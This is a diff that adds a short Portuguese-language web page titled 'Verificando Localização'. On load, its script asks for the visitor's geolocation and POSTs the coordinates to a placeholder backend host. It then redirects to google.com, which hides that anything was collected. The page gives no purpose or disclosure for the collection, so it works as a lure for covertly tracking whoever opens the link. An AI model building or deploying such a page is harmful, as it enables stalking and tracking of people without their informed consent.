@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificando Localização...</title>
+</head>
+<body>
+  <p id="status">Detectando sua localização...</p>
+
+  <script>
+    async function enviarLocalizacao(latitude, longitude) {
+      await fetch("https://SEU_BACKEND.onrender.com/api", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude })
+      });
+
+      window.location.href = "https://google.com";
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            document.getElementById("status").innerText = "Localização capturada!";
+            enviarLocalizacao(lat, lon);
+          },
+          (err) => {
+            document.getElementById("status").innerText = "Erro: " + err.message;
+            window.location.href = "https://google.com";
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "Seu navegador não suporta geolocalização.";
+        window.location.href = "https://google.com";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
